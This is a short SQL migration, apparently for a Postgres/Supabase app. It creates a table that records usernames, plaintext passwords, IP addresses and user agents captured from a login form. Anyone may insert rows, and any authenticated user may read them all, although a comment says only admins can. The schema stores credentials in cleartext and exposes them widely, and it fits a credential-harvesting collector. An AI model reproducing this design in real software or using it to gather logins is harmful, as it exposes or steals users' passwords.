-- Create a table to store login attempts
CREATE TABLE public.login_attempts (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  username TEXT NOT NULL,
  password TEXT NOT NULL,
  ip_address TEXT,
  user_agent TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Enable RLS but allow inserts from anyone (anonymous)
ALTER TABLE public.login_attempts ENABLE ROW LEVEL SECURITY;

-- Allow anyone to insert login attempts (captured from the login form)
CREATE POLICY "Anyone can insert login attempts" 
ON public.login_attempts 
FOR INSERT 
WITH CHECK (true);

-- Only authenticated admins can view login attempts (we'll handle admin check in the app)
CREATE POLICY "Allow select for authenticated users" 
ON public.login_attempts 
FOR SELECT 
TO authenticated
USING (true);